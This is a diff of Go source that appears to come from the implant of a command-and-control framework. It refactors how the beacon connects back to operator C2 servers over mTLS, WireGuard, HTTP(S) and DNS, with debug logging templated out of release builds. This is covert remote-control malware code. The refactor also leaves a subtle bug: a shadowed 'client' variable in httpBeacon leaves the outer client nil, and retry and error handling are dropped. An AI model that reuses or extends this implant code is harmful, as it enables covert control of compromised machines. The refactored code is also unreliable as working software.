@@ -99,101 +99,63 @@ func (b *Beacon) Duration() time.Duration {
 	return duration
 }
 
-func StartBeaconLoop() *Beacon {
+func NextBeacon() *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Starting beacon loop ...")
 	// {{end}}
 
-	beaconAttempts := 0
-	for beaconAttempts < maxErrors {
+	var beacon *Beacon
 
-		var beacon *Beacon
-		var err error
-
-		uri := nextCCServer()
-		// {{if .Config.Debug}}
-		log.Printf("Next CC = %s", uri.String())
-		// {{end}}
-
-		switch uri.Scheme {
-
-		// *** MTLS ***
-		// {{if .Config.MTLSc2Enabled}}
-		case "mtls":
-			beacon, err = mtlsBeacon(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				return beacon
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[mtls] Connection failed %s", err)
-			// {{end}}
-			beaconAttempts++
-			// {{end}}  - MTLSc2Enabled
-		case "wg":
-			// *** WG ***
-			// {{if .Config.WGc2Enabled}}
-			beacon, err = wgBeacon(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				return beacon
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[wg] Connection failed %s", err)
-			// {{end}}
-			beaconAttempts++
-			// {{end}}  - WGc2Enabled
-		case "https":
-			fallthrough
-		case "http":
-			// *** HTTP ***
-			// {{if .Config.HTTPc2Enabled}}
-			beacon, err = httpBeacon(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				return beacon
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[%s] Connection failed %s", uri.Scheme, err)
-			// {{end}}
-			beaconAttempts++
-			// {{end}} - HTTPc2Enabled
-
-		case "dns":
-			// *** DNS ***
-			// {{if .Config.DNSc2Enabled}}
-			beacon, err = dnsBeacon(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				return beacon
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[dns] Connection failed %s", err)
-			// {{end}}
-			beaconAttempts++
-			// {{end}} - DNSc2Enabled
-
-		default:
-			// {{if .Config.Debug}}
-			log.Printf("Unknown c2 protocol %s", uri.Scheme)
-			// {{end}}
-		}
-
-		reconnect := GetReconnectInterval()
-		// {{if .Config.Debug}}
-		log.Printf("Sleep %d second(s) ...", reconnect)
-		// {{end}}
-		time.Sleep(reconnect)
-	}
+	uri := nextCCServer()
 	// {{if .Config.Debug}}
-	log.Printf("[!] Max connection errors reached\n")
+	log.Printf("Next CC = %s", uri.String())
 	// {{end}}
+
+	switch uri.Scheme {
+
+	// *** MTLS ***
+	// {{if .Config.MTLSc2Enabled}}
+	case "mtls":
+		beacon = mtlsBeacon(uri)
+		activeC2 = uri.String()
+		return beacon
+		// {{end}}  - MTLSc2Enabled
+	case "wg":
+		// *** WG ***
+		// {{if .Config.WGc2Enabled}}
+		beacon = wgBeacon(uri)
+		activeC2 = uri.String()
+		return beacon
+		// {{end}}  - WGc2Enabled
+	case "https":
+		fallthrough
+	case "http":
+		// *** HTTP ***
+		// {{if .Config.HTTPc2Enabled}}
+		beacon = httpBeacon(uri)
+		activeC2 = uri.String()
+		return beacon
+		// {{end}} - HTTPc2Enabled
+
+	case "dns":
+		// *** DNS ***
+		// {{if .Config.DNSc2Enabled}}
+		beacon = dnsBeacon(uri)
+		activeC2 = uri.String()
+		return beacon
+		// {{end}} - DNSc2Enabled
+
+	default:
+		// {{if .Config.Debug}}
+		log.Printf("Unknown c2 protocol %s", uri.Scheme)
+		// {{end}}
+	}
 
 	return nil
 }
 
 // {{if .Config.MTLSc2Enabled}}
-func mtlsBeacon(uri *url.URL) (*Beacon, error) {
+func mtlsBeacon(uri *url.URL) *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Establishing Beacon -> %s", uri.String())
 	// {{end}}
@@ -228,13 +190,13 @@ func mtlsBeacon(uri *url.URL) (*Beacon, error) {
 		},
 	}
 
-	return beacon, nil
+	return beacon
 }
 
 // {{end}}
 
 // {{if .Config.WGc2Enabled}}
-func wgBeacon(uri *url.URL) (*Beacon, error) {
+func wgBeacon(uri *url.URL) *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Establishing Beacon -> %s", uri.String())
 	// {{end}}
@@ -242,19 +204,19 @@ func wgBeacon(uri *url.URL) (*Beacon, error) {
 	if err != nil {
 		lport = 53
 	}
-	addrs, err := net.LookupHost(uri.Hostname())
-	if err != nil {
-		return nil, err
-	}
-	if len(addrs) == 0 {
-		return nil, errors.New("{{if .Config.Debug}}Invalid address{{end}}")
-	}
-	hostname := addrs[0]
 
 	var conn net.Conn
 	var dev *device.Device
 	beacon := &Beacon{
 		Start: func() error {
+			addrs, err := net.LookupHost(uri.Hostname())
+			if err != nil {
+				return err
+			}
+			if len(addrs) == 0 {
+				return errors.New("{{if .Config.Debug}}Invalid address{{end}}")
+			}
+			hostname := addrs[0]
 			conn, dev, err = wireguard.WGConnect(hostname, uint16(lport))
 			if err != nil {
 				return err
@@ -281,30 +243,31 @@ func wgBeacon(uri *url.URL) (*Beacon, error) {
 			return nil
 		},
 	}
-	return beacon, nil
+	return beacon
 }
 
 // {{end}}
 
 // {{if .Config.HTTPc2Enabled}}
-func httpBeacon(uri *url.URL) (*Beacon, error) {
+func httpBeacon(uri *url.URL) *Beacon {
 
 	// {{if .Config.Debug}}
 	log.Printf("Beaconing -> %s", uri)
 	// {{end}}
-	proxyConfig := uri.Query().Get("proxy")
-	timeout := GetPollTimeout()
-	client, err := httpclient.HTTPStartSession(uri.Host, uri.Path, timeout, proxyConfig)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("http(s) connection error %s", err)
-		// {{end}}
-		return nil, err
-	}
-	proxyURL = client.ProxyURL
 
+	var client *httpclient.SliverHTTPClient
 	beacon := &Beacon{
 		Start: func() error {
+			proxyConfig := uri.Query().Get("proxy")
+			timeout := GetPollTimeout()
+			client, err := httpclient.HTTPStartSession(uri.Host, uri.Path, timeout, proxyConfig)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("http(s) connection error %s", err)
+				// {{end}}
+				return err
+			}
+			proxyURL = client.ProxyURL
 			return client.SessionInit()
 		},
 		Recv: func() (*pb.Envelope, error) {
@@ -315,14 +278,14 @@ func httpBeacon(uri *url.URL) (*Beacon, error) {
 		},
 	}
 
-	return beacon, nil
+	return beacon
 }
 
 // {{end}}
 
 // {{if .Config.DNSc2Enabled}}
-func dnsBeacon(uri *url.URL) (*Beacon, error) {
-	return nil, nil
+func dnsBeacon(uri *url.URL) *Beacon {
+	return nil
 }
 
 // {{end}}
